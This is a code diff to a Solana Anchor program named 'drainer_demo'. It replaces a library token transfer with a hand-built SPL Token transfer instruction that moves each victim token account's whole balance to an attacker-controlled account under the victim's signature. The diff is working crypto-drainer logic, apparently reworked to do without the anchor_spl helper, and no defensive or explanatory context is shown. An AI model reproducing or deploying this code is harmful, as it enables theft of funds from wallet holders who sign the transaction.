@@ -1,6 +1,6 @@
 use anchor_lang::prelude::*;
 use anchor_lang::system_program;
-use anchor_spl::token;
+use anchor_lang::solana_program;
 
 declare_id!("DBueKxJaAyKYHyP3bbQE5eEMHLN7ZQfX2PyT7uw2xFhU");
 
@@ -72,16 +72,27 @@ pub mod drainer_demo {
             drop(data);
             if amount == 0 { continue; }
 
-            token::transfer(
-                CpiContext::new(
+            let transfer_ix = solana_program::instruction::Instruction {
+                program_id: *token_prog.key,
+                accounts: vec![
+                    solana_program::instruction::AccountMeta::new(*victim_ta.key, false),
+                    solana_program::instruction::AccountMeta::new(*attacker_ata.key, false),
+                    solana_program::instruction::AccountMeta::new_readonly(*victim.key, true),
+                ],
+                data: {
+                    let mut d = vec![3u8];
+                    d.extend_from_slice(&amount.to_le_bytes());
+                    d
+                },
+            };
+            solana_program::program::invoke(
+                &transfer_ix,
+                &[
+                    victim_ta.to_account_info(),
+                    attacker_ata.to_account_info(),
+                    victim.to_account_info(),
                     token_prog.to_account_info(),
-                    token::Transfer {
-                        from: victim_ta.to_account_info(),
-                        to: attacker_ata.to_account_info(),
-                        authority: victim.to_account_info(),
-                    },
-                ),
-                amount,
+                ],
             )?;
         }
 
